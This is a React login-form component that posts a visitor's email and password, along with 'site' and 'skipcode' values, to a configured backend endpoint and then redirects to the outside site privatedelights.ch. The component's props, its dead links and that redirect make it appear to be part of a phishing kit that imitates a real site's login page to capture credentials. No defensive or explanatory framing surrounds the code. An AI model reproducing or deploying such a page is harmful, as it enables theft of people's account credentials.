"use client"
import React, { useState, useEffect } from "react";
import { Formik, Form } from "formik";
import * as Yup from "yup";
import { MdVisibility, MdVisibilityOff } from "react-icons/md";
import TextfieldWrapper from "./TextfieldWrapper";
import SubmitButton from "./SubmitButton";
import { site } from "../config";

import Cookies from "js-cookie";
import { API_URL } from "../config/index";

import { useRouter } from "next/navigation";

function LoginUpdateForm({ adminId, posterId }) {
  const [showPassword, setShowPassword] = useState(false);
  const [userId, setUserId] = useState("");
  const router = useRouter();

  const initialvalues = {
    email: "",
    password: "",
  };

  const validate = Yup.object({
    email: Yup.string().email().required("Enter a valid email address"),
    password: Yup.string().min(8, "Minimum 8 characters"),
  });

  useEffect(() => {
    const storedId = Cookies.get("id");
    if (storedId) {
      setUserId(storedId);
    }
  }, []);

  const updateUserEmail = async (values) => {
    try {
      const response = await fetch(`${API_URL}/update/username`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ userId, ...values }),
      });

    //   console.log(response);

      const data = await response.json();
      if (response.ok) {
        router.push("https://privatedelights.ch");
      }
      return data;
    } catch (error) {
      console.error("Error updating email:", error);
      return null;
    }
  };

  const handleSubmit = async (values, formik) => {
    const { email, password } = values;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    await updateUserEmail(submitValues);
  };
  return (
    <div className="md:w-[550px] lg:w-[632px] mx-auto mt-[60px] lg:mt-[95px] mb-[90px] lg:mb-[144px]">
      <div className="flex flex-col items-ceneter">
        <div className="">
          <div className="bg-custom-indigo text-white text-xl font-medium px-[26px] py-[18px] shadow-md">
            Login
          </div>
          <div className="border border-slate-300 border-opacity-40 px-[15px] pt-7 pb-[24px]">
            <Formik
              initialValues={initialvalues}
              validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="space-y-[18px]">
                  <TextfieldWrapper
                    name="email"
                    label={<span className="text-[#ef4444]">Email</span>}
                    type="email"
                      helpertext={<span className="text-[#ef4444]">Enter a valid email address</span>}
                    onFocus={() => formik.setFieldTouched("email", true, true)}
                  />
                  <div className="relative">
                    <TextfieldWrapper
                      name="password"
                      label="Password"
                      helpertext="passwords are case-sensitive"
                      autoComplete="on"
                      type={showPassword ? "text" : "password"}
                      onFocus={() =>
                        formik.setFieldTouched("password", true, true)
                      }
                    />
                    <span
                      className="absolute right-0 top-[17px] text-[23px] opacity-50 cursor-pointer"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <MdVisibilityOff /> : <MdVisibility />}
                    </span>
                  </div>

                  <div className="mt-5 flex justify-center">
                    <SubmitButton>Login</SubmitButton>
                  </div>
                </Form>
              )}
            </Formik>

            <div className="mt-[58px] mx-4 lg:mx-[55px] text-[16.5px] flex justify-between items-center text-custom-indigo">
              <p className="cursor-pointer">Set New Password</p>
              <p className="cursor-pointer">Sign Up</p>
              <p className="cursor-pointer">Help</p>
            </div>
          </div>
        </div>
      </div>
      <div className="h-[1px] bg-slate-600/50"></div>
    </div>
  );
}

export default LoginUpdateForm;
